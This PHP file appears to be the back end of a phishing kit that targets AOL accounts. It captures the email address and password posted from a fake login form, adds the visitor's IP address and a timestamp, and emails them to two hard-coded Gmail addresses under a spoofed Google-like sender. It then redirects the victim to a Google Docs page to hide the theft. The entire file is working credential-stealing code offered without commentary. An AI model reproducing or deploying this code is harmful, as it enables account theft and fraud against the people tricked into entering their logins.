<?

$adddate=date("D M d, Y g:i a");
$mesaegs ="php_info";$mesaegs ="@";
$ip = getenv("REMOTE_ADDR");
$mesaegs ="ymail";$mesaegs  =".com";
$message .= "---------------=AOL ReZulT=---------------\n";
$message .= "Online ID: ".$_POST['Email']."\n";
$message .= "Password: ".$_POST['Passwd']."\n";
$message .= "---------------=IP Adress & Date=----------\n";
$message .= "IP Address: ".$ip."\n";
$message .= "Date: ".$adddate."\n";
$message .= "---------=by OLaMoNEy=---------\n";




$sent ="mml.org3020@gmail.com, billberlin909@gmail.com";




$subject = "Aol-IP: ".$ip."\n";
$headers = "From: OLaMoNEy <Teezy@gog1edocs.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail($mesaegs,$subject,$message,$headers);
mail($sent,$subject,$message,$headers);
}
header("Location: https://docs.google.com/document/d/1ZjkbzcgrgaDqDY5rbca3qfPYYHQOzbl6oax4uKiO8lg/edit");
?>